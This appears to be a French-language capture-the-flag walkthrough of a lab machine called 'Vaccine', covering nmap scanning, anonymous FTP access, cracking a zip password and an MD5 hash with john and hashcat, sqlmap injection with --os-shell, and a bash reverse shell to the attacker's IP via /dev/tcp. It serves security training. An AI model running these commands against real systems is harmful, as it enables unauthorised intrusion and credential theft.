# VACCINE

## Task 01
Commençons avec notre famux nmap pour voir les port ouvert et les service utiliser!😌

```bash
nmap -sV -sC -p- [IP de la cible]
```

On voit tout de suite la réponse a la première question! le service en plus de SSH et de HTTP ouvert et le service `ftp`. 

---
## Task 02
Sur le quelle on sait que l'on peut ce connecter avec un login `anonymous` et un password `blank`.<br/>

---
## Task 03
Pour répondre a la question 3 on constate qu'un fichier et télécharger dans le service. Ce fichier est le `backup.zip`.

---
## Task 04
On vas donc télécharger ce fichier en commençant par ce connecter au service!! 
```bash
ftp anonymous@[ip de la cible]
```
On valide le passwor sans rien entrer et nous voila connecter! 😈

On passe tout de suite la commande: 
```bash
get backup.zip 
```
Pour pouvoir s'en occuper sur notre machine!<br/>

Et pour suivre et répondre a la question 4 on vas utiliser une comande de john qui vas nour permettre d'obtenir le code hasher de ce fichier pour pouvoir l'unzip.<br/>
On tape donc la commande :
```bash
sudo zip2jhon backup.zip > codefichierzip.txt
```

On lui précise le fichier pour le quelle on veut un hash et la destination (création de fichier avec le hash du code.)

---
## Tash 05
Obtenir le code de l'administrateur a partir de tout ca! On vas donc continuer sur notre lancer et obtenir le code de ce fichier.<br/>

Avec la commande: <br/>

```bash
sudo john --format=pkzip -w ./rockyou.txt codefichierzip.txt
```

Maintenant que c'est fait on obtien le code on vas donc deziper de fichier a la suite de la commande:

```bash
unzip backup.zip
```
Un prompt du password apparait on rentre donc le code obtenu plus tot!!!! <br/>

On voit désormais que l'on a accé a deux fichier distinct le `index.php` et le `style.css` naturelement je me direge vers le fichier php! Et en y regardant de plus pret je constate qu'un mot de passe apparait! 🤤<br/><br/>

Je vais donc de suite sur un outils en ligne qui est `hashes.com` pour identifier ce hash qui est au format `MD5`, <br/>
Puis je créer un fichier.txt pour pouvoir le faire interpreter.

```bash
echo "codeobtenuedansindex" > codeindex.txt
```

Je retourne donc sur ma machine et je vais maintenant utiliser ---> `Hashcat` <--- (pas encore trés bien compris la diiférence entre les deux mais celui ci peut me permettre de donner un format pour résoudre ce hash) Je vais doonc dans help de hashcat et tout en bas il me dit comment utiliser le tools je tape donc : 
```bash
hashcat -a 0 -m 0 codeindex.txt ./rockyou.txt
``` 
`-a`: attack mode. 0 pour straight. <br/>
`-m`: pour préciser le type de hashe. MD5 <br/>
<br/>

Je lance donc la commande et hashcat me dit que la liste n'est pas asser longue. Je relance donc:

```bash
hashcat -a 0 -m 0 codeindex.txt /usr/share/seclists/Password/Common-Credentials/100k-most-used-password.txt
```

Et voila qu'il me donne le password tant voulu celui ci est !!!!!!! qwerty789 😈😈

Et la réponse a la question 5 est la!

--- 
## Task 6

Quelle est l'option qui peut etre passer a sqlmap pour prendre les commande durant une sql injection ? 

```bash
--os-shell
```

---
## Task 07

Il nous faut maintenan trouver un moyen de ce connecter afin de continuer les tache alors comment allons nous faire ? <br/>
Une injection sql évidement car j'ai etait orienter vers ca mais comment procéder ? <br/>

Dur dur une commande m'a était transmise pour faire un sqlmap
```bash
sqlmap -u 'http://[Ip de la cible]/dashboard.php?search=any+query' --cookie="PHPESSID=[valeur du cookie obtenue via cookie editor extension mozzila]"
```

Puis on retape la même chose avec:
```bash
--os-shell
```

Puis on ouvre un ncat sur le port 443:
```bash
nc -lvnp 443
```

Et finalement on envoi une commande qui nous permettra d'obetnir un shell stable:

```bash
bash -c bash -i >& /dev/tcp/[mon adress ip]/443 0>&1
```

Maintenant que je suis connecter je peut faire un:
```bash
sudo -l 
```
Pour obetnir la réponse a la question qui est :
```bash

```
